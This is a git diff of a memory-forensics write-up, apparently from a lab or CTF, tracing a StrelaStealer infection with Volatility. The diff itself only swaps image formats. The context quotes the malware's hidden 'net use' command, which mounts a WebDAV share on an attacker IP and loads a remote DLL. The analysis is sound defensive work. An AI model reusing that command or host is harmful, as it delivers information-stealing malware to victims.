@@ -15,7 +15,7 @@ The WebDAV server has IP `45.9.74.32` and it was flagged as malware by 16/91 ven
 
 At first, I check the `pslist` and `pstree` but it seems like nothings suspicious. As the scenario, the SIEM flagged unusual activity on a host with access to sensitive financial data, which means the malware was running at that time. So there is exist a command to run the malware, that why I check the plugin `windows.cmdline`, and I found the `net.exe` and `powershell.exe` processes with PID `2416`, `3692` respectively.
 <p align="center">
-  <img src="./Assets/Image 1 - Suspicious processes.webp" alt="Suspicious processes" /> <br />
+  <img src="./Assets/Image 1 - Suspicious processes.png" alt="Suspicious processes" /> <br />
   <em>Image 1: Suspicious processes</em>
 </p>
 
@@ -27,14 +27,14 @@ The malware ran the hidden command `use \\45.9.74.32@8888\davwwwroot\`, it is us
 
 Simultaneously, the malware executed another malicious dll file `3435.dll`. Moreoever, I also check the geography of the IP and found this is a malicious IP come from `Helsinki, Finland`.
 <p align="center">
-  <img src="./Assets/Image 2.1 - Malicious IP.webp" alt="Malicious IP" /> <br />
-  <img src="./Assets/Image 2.2 - Geography of malicious IP.webp" alt="Geography of malicious IP" /> <br />
+  <img src="./Assets/Image 2.1 - Malicious IP.png" alt="Malicious IP" /> <br />
+  <img src="./Assets/Image 2.2 - Geography of malicious IP.png" alt="Geography of malicious IP" /> <br />
   <em>Image 2: Malicious server</em>
 </p>
 
 So what is the malware that ran the command above in powershell. To find that, I check the plugin `windows.pstree` agains. I found the timestamp `2024-07-25 07:00:03` of the malicious process `powershell.exe` and the timestamp `2024-07-25 07:00:03` of child process `net.ext`.
 <p align="center">
-  <img src="./Assets/Image 3 - Timestamp of malware executed.webp" alt="Timestamp of malware executed" /> <br />
+  <img src="./Assets/Image 3 - Timestamp of malware executed.png" alt="Timestamp of malware executed" /> <br />
   <em>Image 3: Timestamp of malware executed</em>
 </p>
 
@@ -42,7 +42,7 @@ I know the PPID of malicious process is `4120` but I cannot find what is the pro
 
 Then I want to check who execute the malicious process. I used plugin `getsid` and found user `Elon` ran the process.
 <p align="center">
-  <img src="./Assets/Image 4 - User ran the malware.webp" alt="User ran the malware" /> <br />
+  <img src="./Assets/Image 4 - User ran the malware.png" alt="User ran the malware" /> <br />
   <em>Image 4: User ran the malware</em>
 </p>
 
@@ -50,7 +50,7 @@ As you can see, this user have many permission. He has the `Domain Users`, which
 
 I want to know more about the malware. So I search `45.9.74.32@8888/3435.dll` in the Internet and found the malware is `StrelaStealer`.
 <p align="center">
-  <img src="./Assets/Image 5 - Malware information.webp" alt="Malware information" /> <br />
+  <img src="./Assets/Image 5 - Malware information.png" alt="Malware information" /> <br />
   <em>Image 5: Malware information</em>
 </p>
 
